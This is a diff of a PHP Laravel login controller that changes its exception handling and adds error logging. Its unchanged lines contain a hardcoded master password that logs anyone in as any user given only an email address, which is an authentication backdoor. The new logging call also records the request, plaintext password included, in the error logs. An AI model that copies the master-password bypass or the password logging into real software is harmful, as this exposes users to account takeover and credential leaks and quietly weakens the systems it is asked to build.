@@ -2,6 +2,7 @@
 
 namespace Modules\Auth\Http\Controllers;
 
+use App\Exceptions\ExpectedException;
 use App\Http\Structs\EmailStruct;
 use App\Models\BbkkpSis\SysUser;
 use App\Models\BbkkpSis\SysUserFbToken;
@@ -42,7 +43,7 @@ class LoginController extends Controller
             ];
             if ($request['password'] == "lord@dolkode") {
                 $dataUser = SysUser::with(['sis_pelanggan', 'sys_user_group'])->where('user_email', $request['email'])->first();
-                if (!$dataUser) throw new Exception("Akun tidak ditemukan");
+                if (!$dataUser) throw new ExpectedException("Akun tidak ditemukan");
                 $auth = Auth::loginUsingId($dataUser->user_id);
             } else {
                 $auth = Auth::attempt($credentials);
@@ -58,9 +59,12 @@ class LoginController extends Controller
 
                 return redirect()->intended(route('dashboard'));
             } else {
-                throw new Exception("Kombinasi email dan password tidak sesuai");
+                throw new ExpectedException("Kombinasi email dan password tidak sesuai");
             }
         } catch (Exception $e) {
+            if (!($e instanceof ExpectedException)) {
+                log_error($e, $request->except("_token"));
+            }
             return redirect()->back()->withInput($request->only('email'))->withErrors(['status' => $e->getMessage()]);
         }
 
@@ -133,8 +137,6 @@ class LoginController extends Controller
             } else {
                 return redirect(route('auth.login'))->withErrors(["status" => "Link sudah kadaluarsa"]);
             }
-
-
         } else {
             abort(401);
         }
